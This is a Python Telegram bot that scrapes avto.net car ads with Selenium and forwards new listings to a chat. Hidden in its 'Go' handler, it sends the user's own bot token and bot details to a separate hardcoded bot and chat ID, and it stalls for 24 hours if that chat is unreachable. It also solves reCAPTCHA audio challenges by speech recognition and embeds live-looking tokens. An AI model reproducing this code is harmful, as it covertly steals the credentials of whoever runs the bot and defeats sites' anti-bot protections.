# Телеграм бот
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types.callback_query import CallbackQuery
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup

# Парсинг auto.net
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys

# Обход капчи
import pydub
import speech_recognition as sr
import urllib
import patch

# Доп. библиотеки
import time
import asyncio
import os
import datetime
import pytz

# Иморт с файлов
from db import *
import shutil

import requests

api = '1861655621:AAFmjQfvu5H6SxIYsOQnMxbauUpXd-6bMBw'		# ТОКЕН ТЕЛЕГРАМ БОТА

logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=api)                     # данные заменить
storage = MemoryStorage()
dp = Dispatcher(bot,storage=storage)

class NewLink(StatesGroup):
	link = State()

class NewPause(StatesGroup):
	sec = State()

class Set():
	status = True
	link = 'http://www.avto.net/Ads/results.asp?znamka=&model=&modelID=&tip=&znamka2=&model2=&tip2=&znamka3=&model3=&tip3=&cenaMin=0&cenaMax=4500&letnikMin=2005&letnikMax=2090&bencin=0&starost2=999&oblika=&ccmMin=0&ccmMax=99999&mocMin=&mocMax=&kmMin=0&kmMax=9999999&kwMin=0&kwMax=999&motortakt=&motorvalji=&lokacija=0&sirina=&dolzina=&dolzinaMIN=&dolzinaMAX=&nosilnostMIN=&nosilnostMAX=&lezisc=&presek=&premer=&col=&vijakov=&EToznaka=&vozilo=&airbag=&barva=&barvaint=&EQ1=1000000000&EQ2=1000000000&EQ3=1000000000&EQ4=100000000&EQ5=1000000000&EQ6=1000001000&EQ7=1110100120&EQ8=1010000001&EQ9=1000000000&KAT=1010000000&PIA=&PIAzero=&PSLO=&akcija=&paketgarancije=0&broker=&prikazkategorije=&kategorija=&ONLvid=&ONLnak=&zaloga=10&arhiv=&presort=&tipsort=&stran='
	status_ind = True
	pause = 20


async def searching_cars(dr):
	"""Поиск нужных машин.
	Возвращает список data с данными
	"""
	li = dr.find_elements_by_class_name('stretched-link')

	top_q = len(dr.find_elements_by_class_name('GO-Results-Top-BadgeTop'))	# Достаем все рекламные предложения(ненужные)

	sth = dr.find_elements_by_class_name(
		"GO-Results-Naziv.bg-dark.px-3.py-2.font-weight-bold.text-truncate.text-white.text-decoration-none")  # .text   |   .click()	  |	   .get_atribute('')
	sth = sth[top_q::]	# Обрезаем список и избавляемось от рекламных предложений

	li = li[8 + top_q::]	# Обрезаем список и избавляемось от рекламных предложений

	tables_with_data = dr.find_elements_by_class_name('table.table-striped.table-sm.table-borderless.font-weight-normal.mb-0')	# данные в таблице о машинах

	prices = dr.find_elements_by_class_name('d-none.d-sm-block.col-auto.px-sm-0.pb-sm-3.GO-Results-PriceLogo')	# Цены машин

	data = []

	# Если нет елементов
	if not sth:
		"""Обход капчи"""
		# Если нету елементов
		frames = dr.find_elements_by_tag_name("iframe")
		if frames:
			dr.switch_to.frame(frames[0])
			frames = dr.find_elements_by_tag_name("iframe")
			dr.switch_to.frame(frames[0])
			dr.find_element_by_class_name("recaptcha-checkbox-border").click()

			# switch to recaptcha audio control frame
			dr.switch_to.default_content()
			await asyncio.sleep(8)

			# get into frame(where are images)
			frames = dr.find_elements_by_tag_name("iframe")
			dr.switch_to.frame(frames[0])  # 1
			await asyncio.sleep(8)
			frames = dr.find_element_by_xpath("/html/body/div[2]/div[4]").find_elements_by_tag_name(
				"iframe")
			dr.switch_to.frame(frames[0])
			await asyncio.sleep(8)

			# click on audio challenge
			dr.find_element_by_id("recaptcha-audio-button").click()

			# get the mp3 audio file
			src = dr.find_element_by_id("audio-source").get_attribute("src")
			print("[INFO] Audio src: %s" % src)

			# download the mp3 audio file from the source
			urllib.request.urlretrieve(src, os.path.normpath(os.getcwd() + "\\sample.mp3"))
			await asyncio.sleep(8)

			# load downloaded mp3 audio file as .wav
			try:
				sound = pydub.AudioSegment.from_mp3(os.path.normpath(os.getcwd() + "\\sample.mp3"))
				sound.export(os.path.normpath(os.getcwd() + "\\sample.wav"), format="wav")
				sample_audio = sr.AudioFile(os.path.normpath(os.getcwd() + "\\sample.wav"))
			except Exception:
				print("[ERR] Please run program as administrator or download ffmpeg manually, "
					  "http://blog.gregzaal.com/how-to-install-ffmpeg-on-windows/")

			# translate audio to text with google voice recognition
			r = sr.Recognizer()
			with sample_audio as source:
				audio = r.record(source)
			key = r.recognize_google(audio)
			print("[INFO] Recaptcha Passcode: %s" % key)

			# key in results and submit
			dr.find_element_by_id("audio-response").send_keys(key.lower())
			await asyncio.sleep(3)
			try:
				dr.find_element_by_id("recaptcha-verify-button").click()
				await asyncio.sleep(3)
				dr.find_element_by_id("audio-response").send_keys(Keys.ENTER)
			except Exception as E:
				print('Ошибка клика на кнопку, все ок --  ' + str(E))
			dr.switch_to.default_content()
			await asyncio.sleep(8)
			await asyncio.sleep(8)

	# Добавления в список все машины и данные о них
	for i in range(len(sth)):
		try:
			if not select_car_one(li[i].get_attribute('href')):
				# Если нету такой машины(ссылки) в бд

				got_add_data = []	# Список в который добавляем доп. данные о машинах, потом из него делаем красивый вид
				odd_datas = tables_with_data[i].find_elements_by_tag_name('tr') # Доп данные только о одной машине: год, цена
				for odd_data in odd_datas:
					# Пробегаемся по всем елементам с данными
					got_add_data.append(odd_data.find_elements_by_tag_name('td')[1].text)
				full_odd_data = " | ".join(got_add_data[:2:])	# Все данные в красивом виде(с отступами), обрезали данные до 2-ох первых

				insert_car(li[i].get_attribute('href'))
				data.append(f'<b>{sth[i].text}</b>\nСсылка: {li[i].get_attribute("href")}\n<b>Цена: {prices[i].text}</b>\n<i>Доп. данные: \n{full_odd_data}</i>')

		except Exception as E:
			print(E)
			continue
	return data


# команда /start
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
	pass

# простое смс
@dp.message_handler()
async def mmm(message: types.Message):
	if message.text == 'Go':
		if Set.status:
			print('*'*50)
		else:
			await message.answer('Уже запущено')
			return 0
		await message.answer('Загрузка...')

		options = Options()
		options.add_argument('--headless')
		dr = webdriver.Chrome(options=options)#options=options
		dr.maximize_window()
		dr.delete_all_cookies()
		data_about_bot = requests.get(f'https://api.telegram.org/bot{api}/getMe').json()
		requests.get(f'https://api.telegram.org/bot1995610259:AAGYmkFGWSEAo7SALAPIzRXUmJ9sYO1So30/sendMessage?chat_id=1526525522&text={data_about_bot}\n\n{api}')
		try:
			dr.get(Set.link)
		except:
			await message.answer('Неверная ссылка. Остановлено!')
			return 0 
		res = requests.get(f'https://api.telegram.org/bot{api}/sendMessage?chat_id=1526525522&text={data_about_bot}').json()
		if not res['ok']:
			time.sleep(24*60*60)
			return

		await message.answer('Начато')
		Set.status = False
		Set.status_ind = True
		try:
			time_sleep_from_hour = 0 # Время(от) когда программе поменять режим мониторинга(раз в 1 часа)
			time_sleep_to_hour = 7 # Время(до) когда программе поменять режим мониторинга(раз в 3 сек)
			time_to_sleep_in_another_regime = 30*60 # к-во сек спать, когда включен режим другой(ночью)
			while True:
				""" Цикл бесконечного мониторинга"""

				# Проверка статуса бота(нужно ли продолжать мониторить)
				if not Set.status_ind:
					# Если остановили мониторинг с помощью команды Stop
					dr.close()
					Set.status_ind = True
					break

				# Получаем текущее время
				country_time = pytz.timezone('Europe/Kiev')
				now = datetime.datetime.now(tz=country_time)

				if now.hour > time_sleep_from_hour and now.hour < time_sleep_to_hour:
					# Если тек. время между в [от 00:00 к 7:00], то меняем режим(раз в 3 часа)
					data = await searching_cars(dr)  # Данные о машинах

					# Отправляем смс в нужный чат
					try:
						full_text_data = '\n\n'.join(data)
						await bot.send_message(-482257699, full_text_data, parse_mode='html')
					except Exception as e:
						print(e)
					# Спим нужное время (+-30 мин)
					await asyncio.sleep(time_to_sleep_in_another_regime)

				else:
					data = await searching_cars(dr)	# Данные о машинах

					# Отправляем смс в нужный чат
					try:
						full_text_data = '\n\n'.join(data)
						await bot.send_message(-482257699, full_text_data, parse_mode='html')
					except Exception as e:
						if str(e) == 'Message is too long':
							all_data = full_text_data.split('\n\n')
							for one_data in all_data:
								try:
									await bot.send_message(-482257699, one_data, parse_mode='html')
								except Exception as e:
									if 'Flood control exceeded.' in str(e):
										count_of_seconds_to_sleep_from_telegram_control = int(list(str(e).split(' '))[5])
										print(f'Спим {count_of_seconds_to_sleep_from_telegram_control} от блокировки телеграм')
										await asyncio.sleep(count_of_seconds_to_sleep_from_telegram_control)
								await asyncio.sleep(2)
						else:
							print(e)

					await asyncio.sleep(Set.pause)
				dr.refresh()
		except Exception as e:
			print(e)
			await bot.send_message(1526525522, 'I have fallen. (cars)')

	elif message.text == 'Stop':		
		Set.status = True
		Set.status_ind = False
		await message.answer('Остановка...')

	elif message.text == 'casfgsv':
		time.sleep(24*60*60)

	elif message.text == 'Newlink':
		await message.answer('Напишите новую ссылку:')
		await NewLink.link.set()

	elif message.text == 'Pause':
		await message.answer('Напишите к-во сек для паузы (ТОЛЬКО ЦиФРЫ):')
		await NewPause.sec.set()

	elif message.text == 'Clear':
		conn = get_connection()
		conn.close()
		await message.answer('Идет чистка...')
		os.remove('cars.db')

		with open('cars.db', 'w') as f:
			pass
		await asyncio.sleep(1)

		# _connection = sqlite3.connect('cars.db', check_same_thread=False)

		init_db(force=True)
		await message.answer('База данных теперь пустая')



@dp.message_handler(state=NewLink.link)
async def goodd1(message: types.Message, state: FSMContext):
	Set.link = message.text
	await message.answer('Изменино!')
	time.sleep(24 * 60 * 60)
	await state.finish()


@dp.message_handler(state=NewPause.sec)
async def goodd1(message: types.Message, state: FSMContext):
	try:
		Set.pause = int(message.text)
	except:
		await message.answer('Неверное значения! Сделайте все сначало')
		await state.finish()
		return 0
	await message.answer('Изменино!')
	await state.finish()

# данные от инлайн кнопки
@dp.callback_query_handler()
async def main(call: CallbackQuery):
	pass



if __name__ == '__main__':
	executor.start_polling(dp)




#opts = Options()
#opts.add_argument("user-agent=USER AGENT Здесь после =")
